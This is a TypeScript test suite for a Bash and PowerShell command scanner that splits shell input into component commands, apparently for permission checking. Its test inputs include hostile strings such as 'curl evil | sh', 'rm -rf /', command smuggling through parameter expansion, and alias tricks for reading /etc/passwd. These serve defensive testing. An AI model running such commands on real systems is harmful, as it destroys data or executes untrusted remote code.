import { describe, expect, test } from "bun:test"
import { ShellScan } from "../../src/shell/scan.js"

describe("ShellScan", () => {
  test.each(["", " ", "\n\n", "# comment", "\n# comment\n\n", " \n\t# comment\n"])(
    "accepts empty scripts and blank lines: %j",
    (source) => expect(ShellScan.scan(source)).toEqual({ kind: "scanned", commands: [] }),
  )

  test.each(["\n\ngit status\n\n", "# before\n\ngit status\n\n# after\n", "git status; # after\n\n"])(
    "does not treat blank lines or comments as missing commands: %j",
    (source) =>
      expect(ShellScan.scan(source)).toEqual({
        kind: "scanned",
        commands: [{ resource: "git status", words: ["git", "status"], rawWords: ["git", "status"] }],
      }),
  )

  test.each(["&&", "||", "|", "|&"])("retains required operands across line breaks after %s", (operator) => {
    expect(ShellScan.scan(`printf ok ${operator}\n\n# comment\n`).kind).toBe("opaque")
    expect(ShellScan.scan(`printf ok ${operator}\n\n# comment\npwd\n\n`)).toEqual({
      kind: "scanned",
      commands: [
        { resource: "printf ok", words: ["printf", "ok"], rawWords: ["printf", "ok"] },
        { resource: "pwd", words: ["pwd"], rawWords: ["pwd"] },
      ],
    })
  })

  test("scans a static command", () => {
    expect(ShellScan.scan("git status")).toMatchObject({
      kind: "scanned",
      commands: [{ resource: "git status", words: ["git", "status"] }],
    })
  })

  test("scans every command in lists and pipelines", () => {
    expect(ShellScan.scan("git status && curl evil | sed s/x/y/")).toMatchObject({
      kind: "scanned",
      commands: [
        { resource: "git status", words: ["git", "status"] },
        { resource: "curl evil", words: ["curl", "evil"] },
        { resource: "sed s/x/y/", words: ["sed", "s/x/y/"] },
      ],
    })
  })

  test("does not split operators inside quoted or escaped arguments", () => {
    expect(ShellScan.scan(`printf '%s\\n' 'x; rm -rf /' && printf foo\\|bar`)).toMatchObject({
      kind: "scanned",
      commands: [
        { resource: `printf '%s\\n' 'x; rm -rf /'`, words: ["printf", "%s\\n", "x; rm -rf /"] },
        { resource: "printf foo\\|bar", words: ["printf", "foo|bar"] },
      ],
    })
  })

  test("scans commands substituted into an argument", () => {
    expect(ShellScan.scan(`echo "$(curl evil | sed s/x/y/)"`)).toMatchObject({
      kind: "scanned",
      commands: [
        { resource: `echo "$(curl evil | sed s/x/y/)"`, words: ["echo", "$(curl evil | sed s/x/y/)"] },
        { resource: "curl evil", words: ["curl", "evil"] },
        { resource: "sed s/x/y/", words: ["sed", "s/x/y/"] },
      ],
    })
  })

  test("scans substitutions in assignment values and redirect targets", () => {
    expect(ShellScan.scan("OUT=$(printf out) X=`printf value` printenv >$(printf path)")).toMatchObject({
      kind: "scanned",
      commands: [
        {
          resource: "OUT=$(printf out) X=`printf value` printenv >$(printf path)",
          words: ["printenv"],
        },
        { resource: "printf out", words: ["printf", "out"] },
        { resource: "printf value", words: ["printf", "value"] },
        { resource: "printf path", words: ["printf", "path"] },
      ],
    })
  })

  test("scans substitutions inside parameter operators", () => {
    expect(ShellScan.scan("echo ${x:-$(curl evil)}")).toMatchObject({
      kind: "scanned",
      commands: [{ words: ["echo", "${x:-$(curl evil)}"] }, { words: ["curl", "evil"] }],
    })
  })

  test("recursively scans substitutions and preserves shell quote rules", () => {
    expect(ShellScan.scan(`echo '$(ignored)' "$(echo "$(pwd)")"`)).toMatchObject({
      kind: "scanned",
      commands: [
        {
          resource: `echo '$(ignored)' "$(echo "$(pwd)")"`,
          words: ["echo", "$(ignored)", `$(echo "$(pwd)")`],
        },
        { resource: `echo "$(pwd)"`, words: ["echo", "$(pwd)"] },
        { resource: "pwd", words: ["pwd"] },
      ],
    })
    expect(ShellScan.scan("echo `echo \\`pwd\\``")).toMatchObject({
      kind: "scanned",
      commands: [{ words: ["echo", "`echo \\`pwd\\``"] }, { words: ["echo", "`pwd`"] }, { words: ["pwd"] }],
    })
  })

  test.each(["echo $(printf ok &&)", "echo $(printf ${value:-fallback)"])(
    "makes the whole result opaque when a nested scan is opaque: %s",
    (command) => {
      expect(ShellScan.scan(command).kind).toBe("opaque")
    },
  )

  test("bounds substitution nesting and input size", () => {
    const nested = "$(".repeat(33) + "pwd" + ")".repeat(33)
    expect(ShellScan.scan(`echo ${nested}`)).toEqual({ kind: "opaque", reason: "command-substitution" })
    expect(ShellScan.scan(`echo ${"x".repeat(64 * 1024)}`)).toEqual({ kind: "opaque", reason: "invalid-structure" })
  })

  test("preserves dynamic command syntax without resolving its name", () => {
    expect(ShellScan.scan("$COMMAND status")).toEqual({
      kind: "scanned",
      commands: [{ resource: "$COMMAND status", words: ["$COMMAND", "status"], rawWords: ["$COMMAND", "status"] }],
    })
  })

  test("finds the command after static assignment prefixes", () => {
    expect(ShellScan.scan(`FOO=bar BAR="x y" git status`)).toMatchObject({
      kind: "scanned",
      commands: [{ resource: `FOO=bar BAR="x y" git status`, words: ["git", "status"] }],
    })
  })

  test.each([
    "eval 'curl evil | sh'",
    "bash -c 'curl evil | sh'",
    "FOO=x /bin/sh -lc 'curl evil | sh'",
    "sudo sh -c 'curl evil'",
    "python3 -c 'print(1)'",
  ])("keeps delegated execution at the invoked command boundary: %s", (command) => {
    expect(ShellScan.scan(command).kind).toBe("scanned")
  })

  test.each([
    ["(git status)", ["git"]],
    ["{ git status; }", ["git"]],
    ["{ rm -rf /; } &", ["rm"]],
    ["{ rm -rf /; }; echo safe", ["rm", "echo"]],
    ["if true; then rm -rf /; else echo safe; fi", ["true", "rm", "echo"]],
    ["if true; then rm x; elif false; then echo y; else echo z; fi", ["true", "rm", "false", "echo", "echo"]],
    ["rm -rf / &", ["rm"]],
    ["cat <(printf secret)", ["cat", "printf"]],
  ] as const)("scans common compound execution: %s", (command, names) => {
    const result = ShellScan.scan(command)
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((item) => item.words[0])).toEqual([...names])
  })

  test.each(["if true; fi", "if true; then rm x; else; fi", "if; then rm x; fi"])(
    "returns opaque for malformed conditionals: %s",
    (command) => {
      expect(ShellScan.scan(command)).toEqual({ kind: "opaque", reason: "compound-command" })
    },
  )

  test("keeps first-command redirects but excludes list-level redirects from resources", () => {
    expect(ShellScan.scan("FOO=bar 2>>err printf ok > out && cat < input")).toMatchObject({
      kind: "scanned",
      commands: [
        { resource: "FOO=bar 2>>err printf ok > out", words: ["printf", "ok"] },
        { resource: "cat", words: ["cat"] },
      ],
    })
  })

  test("recognizes redirects without surrounding whitespace", () => {
    expect(ShellScan.scan("printf ok>out 2>&1|cat<input")).toMatchObject({
      kind: "scanned",
      commands: [
        { resource: "printf ok>out 2>&1", words: ["printf", "ok"] },
        { resource: "cat", words: ["cat"] },
      ],
    })
  })

  test.each(["printf ok &&", "| sh", "printf ok || || sh", "printf ok >", "()", "( \n )", "{ ; }"])(
    "returns opaque for malformed command structure: %s",
    (command) => {
      expect(ShellScan.scan(command).kind).toBe("opaque")
    },
  )

  test("ignores comments outside words", () => {
    expect(ShellScan.scan("printf ok # ; curl evil | sh")).toMatchObject({
      kind: "scanned",
      commands: [{ resource: "printf ok", words: ["printf", "ok"] }],
    })
  })

  test.each(["cat <<EOF\n$(curl evil | sh)\nEOF", "cat <<'EOF'\nstatic body\nEOF"])(
    "scans heredoc commands and expansions: %s",
    (command) => {
      expect(ShellScan.scan(command).kind).toBe("scanned")
    },
  )

  test("does not invent a command for assignment-only input", () => {
    expect(ShellScan.scan("FOO=bar")).toEqual({ kind: "scanned", commands: [] })
  })

  test.each([
    ["PATH=.; git status", ["git"]],
    ["PATH=. # comment\ngit status", ["git"]],
    ["CDPATH=/usr # comment\ncd bin; rm victim", ["cd", "rm"]],
    ["HOME=/etc # comment\ncd; rm victim", ["cd", "rm"]],
    ["VALUE=$(printf 2); echo $((VALUE + 1))", ["printf", "echo"]],
  ] as const)("scans assignment-only boundaries without evaluating their effects: %s", (command, names) => {
    const result = ShellScan.scan(command)
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual([...names])
  })

  test.each(["echo ${url:-http://example.test}", "printf '%s' \"${PATH//:/$'\\n'}\""])(
    "scans parameter operator grammar without interpreting values: %s",
    (command) => expect(ShellScan.scan(command).kind).toBe("scanned"),
  )

  test.each([
    ":; { touch /tmp/victim; }",
    "{fd}>/tmp/log touch /tmp/victim",
    "time touch /tmp/victim",
    "printf '%s' \"$(printf safe ${x%)}; touch /tmp/victim)\"",
    "s=abc; x='a[$(touch /tmp/victim)0]'; printf '%s' \"${s:x}\"",
    "ref='x[$(touch /tmp/victim)0]'; printf '%s' \"${!ref}\"",
    "if true; then echo safe; fi > /tmp/victim",
    "if true; then :; 'if' victim; fi",
  ])("scans Bash lexical forms without interpreting shell values: %s", (command) => {
    expect(ShellScan.scan(command).kind).toBe("scanned")
  })
  test("bounds nested parameter expansions", () => {
    expect(ShellScan.scan(`printf '%s' "${"${".repeat(1000)}x${"}".repeat(1000)}"`).kind).toBe("opaque")
  })
})

describe("ShellScan lexical provenance", () => {
  test("retains Bash quotes and escapes while excluding assignment prefixes and redirects", () => {
    const source = `FOO='x y' 2>"error log" g"it" 'status' a\\ b "" >output`
    expect(ShellScan.scan(source)).toEqual({
      kind: "scanned",
      commands: [
        {
          resource: source,
          words: ["git", "status", "a b", ""],
          rawWords: ['g"it"', "'status'", "a\\ b", '""'],
        },
      ],
    })
  })

  test("does not mistake quoted assignment-like words or fd numbers for shell syntax", () => {
    expect(ShellScan.scan(`F"OO"=bar '123'>out`)).toEqual({
      kind: "scanned",
      commands: [{ resource: `F"OO"=bar '123'>out`, words: ["FOO=bar", "123"], rawWords: ['F"OO"=bar', "'123'"] }],
    })
  })

  test("retains nested Bash substitutions and continuations from the original token", () => {
    const source = "echo \"$(printf '%s' 2)\" a\\\nb; pwd"
    const result = ShellScan.scan(source)
    expect(result).toEqual({
      kind: "scanned",
      commands: [
        {
          resource: "echo \"$(printf '%s' 2)\" a\\\nb",
          words: ["echo", "$(printf '%s' 2)", "ab"],
          rawWords: ["echo", "\"$(printf '%s' 2)\"", "a\\\nb"],
        },
        { resource: "printf '%s' 2", words: ["printf", "%s", "2"], rawWords: ["printf", "'%s'", "2"] },
        { resource: "pwd", words: ["pwd"], rawWords: ["pwd"] },
      ],
    })
  })

  test("retains PowerShell invocation quotes, escaped words, and empty arguments", () => {
    const source = `& 'Write-Output' "a""b" a\`#b '' >'out file' 2>&1`
    expect(ShellScan.scanPowerShell(source)).toMatchObject({
      kind: "scanned",
      commands: [
        {
          resource: source,
          words: ["Write-Output", 'a"b', "a#b", ""],
          rawWords: ["'Write-Output'", '"a""b"', "a`#b", "''"],
        },
      ],
    })
  })

  test("keeps separate PowerShell literal tokens and nested script block spans", () => {
    const source = "ForEach-Object { Write-Output 'safe'tail }"
    expect(ShellScan.scanPowerShell(source)).toMatchObject({
      kind: "scanned",
      commands: [
        {
          resource: source,
          words: ["ForEach-Object", "{ Write-Output 'safe'tail }"],
          rawWords: ["ForEach-Object", "{ Write-Output 'safe'tail }"],
        },
        {
          resource: "Write-Output 'safe'tail",
          words: ["Write-Output", "safe", "tail"],
          rawWords: ["Write-Output", "'safe'", "tail"],
        },
      ],
    })
  })
})

describe("ShellScan PowerShell", () => {
  test("keeps adjacent invocation operators in resources", () => {
    expect(ShellScan.scanPowerShell("&Remove-Item victim")).toMatchObject({
      kind: "scanned",
      commands: [{ resource: "&Remove-Item victim", words: ["Remove-Item", "victim"] }],
    })
  })

  test("does not carry redirect state through comments", () => {
    const result = ShellScan.scanPowerShell("< # comment\nRemove-Item victim")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["<", "Remove-Item"])
  })

  test("scans module-qualified commands", () => {
    const result = ShellScan.scanPowerShell("Microsoft.PowerShell.Management\\Get-Item x; Remove-Item y")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual([
      "Microsoft.PowerShell.Management\\Get-Item",
      "Remove-Item",
    ])
  })

  test("splits carriage-return statement separators", () => {
    const result = ShellScan.scanPowerShell("Get-ChildItem\rRemove-Item victim")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["Get-ChildItem", "Remove-Item"])
  })

  test("splits CRLF statement separators", () => {
    const result = ShellScan.scanPowerShell("Get-ChildItem\r\nRemove-Item victim")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["Get-ChildItem", "Remove-Item"])
  })

  test("ends comments at carriage returns", () => {
    const result = ShellScan.scanPowerShell("# comment\rRemove-Item victim")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["Remove-Item"])
  })

  test("scans static commands and pipelines", () => {
    expect(ShellScan.scanPowerShell("Get-ChildItem; Write-Output 'done' | Out-File output.txt")).toMatchObject({
      kind: "scanned",
      commands: [
        { resource: "Get-ChildItem", words: ["Get-ChildItem"] },
        { resource: "Write-Output 'done'", words: ["Write-Output", "done"] },
        { resource: "Out-File output.txt", words: ["Out-File", "output.txt"] },
      ],
    })
  })

  test("keeps separators inside strings", () => {
    expect(ShellScan.scanPowerShell('Write-Output "safe; still safe"')).toMatchObject({
      kind: "scanned",
      commands: [{ resource: 'Write-Output "safe; still safe"', words: ["Write-Output", "safe; still safe"] }],
    })
  })

  test("keeps escaped command separators in the argument", () => {
    expect(ShellScan.scanPowerShell("Write-Output foo`;bar")).toMatchObject({
      kind: "scanned",
      commands: [{ resource: "Write-Output foo`;bar", words: ["Write-Output", "foo;bar"] }],
    })
  })

  test("keeps escaped newlines in a started generic token", () => {
    expect(ShellScan.scanPowerShell("Write-Output x`\nRemove-Item victim")).toMatchObject({
      kind: "scanned",
      commands: [
        { resource: "Write-Output x`\nRemove-Item victim", words: ["Write-Output", "x\nRemove-Item", "victim"] },
      ],
    })
  })

  test("uses PowerShell quote escaping rules", () => {
    expect(
      ShellScan.scanPowerShell("Write-Output 'a''b; still string'; Write-Output \"a`\"; still string\""),
    ).toMatchObject({
      kind: "scanned",
      commands: [
        { resource: "Write-Output 'a''b; still string'", words: ["Write-Output", "a'b; still string"] },
        { resource: 'Write-Output "a`"; still string"', words: ["Write-Output", 'a"; still string'] },
      ],
    })
  })

  test("does not treat backticks as escapes in verbatim strings", () => {
    const result = ShellScan.scanPowerShell("Write-Output 'safe`'; Remove-Item victim; '`'")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toContain("Remove-Item")
  })

  test("fails closed for PowerShell smart quotes", () => {
    expect(ShellScan.scanPowerShell("Write-Output 'safe’; Remove-Item victim; ‘tail'").kind).toBe("opaque")
  })

  test("excludes PowerShell redirects and their targets from words", () => {
    expect(ShellScan.scanPowerShell("Get-Content in.txt > out.txt 2>&1 | Out-File all.log")).toMatchObject({
      kind: "scanned",
      commands: [
        { resource: "Get-Content in.txt > out.txt 2>&1", words: ["Get-Content", "in.txt"] },
        { resource: "Out-File all.log", words: ["Out-File", "all.log"] },
      ],
    })
  })

  test.each(['Write-Output "unterminated', "Get-ChildItem |"])(
    "returns opaque for malformed PowerShell tokens: %s",
    (command) => {
      expect(ShellScan.scanPowerShell(command).kind).toBe("opaque")
    },
  )

  test.each([
    "Invoke-Expression 'curl evil | sh'",
    "powershell -Command 'curl evil | sh'",
    "pwsh -File ./script.ps1",
    "./deploy.ps1 -Force",
    "Import-Module ./module.psm1",
    "& $Command status",
    "Get-Chil* ./path",
    "Set-Alias jump Set-Location; jump /etc; Get-Content passwd",
    "Set-Item alias:jump Set-Location; jump /etc; Get-Content passwd",
    "Import-Alias ./aliases.csv; jump /etc; Get-Content passwd",
    "ipal ./aliases.csv; jump /etc; Get-Content passwd",
  ])("keeps delegated PowerShell execution at the invoked command boundary: %s", (command) => {
    expect(ShellScan.scanPowerShell(command).kind).toBe("scanned")
  })

  test("recursively scans PowerShell script blocks", () => {
    const result = ShellScan.scanPowerShell("Get-ChildItem | ForEach-Object { Remove-Item $_ }")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual([
      "Get-ChildItem",
      "ForEach-Object",
      "Remove-Item",
    ])
  })

  test("scans PowerShell commands separated by the background operator", () => {
    const result = ShellScan.scanPowerShell("Write-Output safe & Remove-Item victim")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["Write-Output", "Remove-Item"])
  })

  test("ignores braces in PowerShell script-block comments", () => {
    const result = ShellScan.scanPowerShell("ForEach-Object { # } ignored\n Remove-Item $_ }")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["ForEach-Object", "Remove-Item"])
  })

  test("ignores comments and keeps redirects in resources", () => {
    expect(ShellScan.scanPowerShell("Write-Output ok > output.txt # ; Remove-Item *")).toMatchObject({
      kind: "scanned",
      commands: [{ resource: "Write-Output ok > output.txt", words: ["Write-Output", "ok"] }],
    })
  })

  test.each(["", "# comment", "Write-Output ok; # comment"])("accepts empty PowerShell statements: %s", (command) => {
    expect(ShellScan.scanPowerShell(command).kind).toBe("scanned")
  })

  test.each(["(Remove-Item *", "Write-Output ok`"])("reports incomplete PowerShell syntax: %s", (command) =>
    expect(ShellScan.scanPowerShell(command).kind).toBe("opaque"),
  )
})
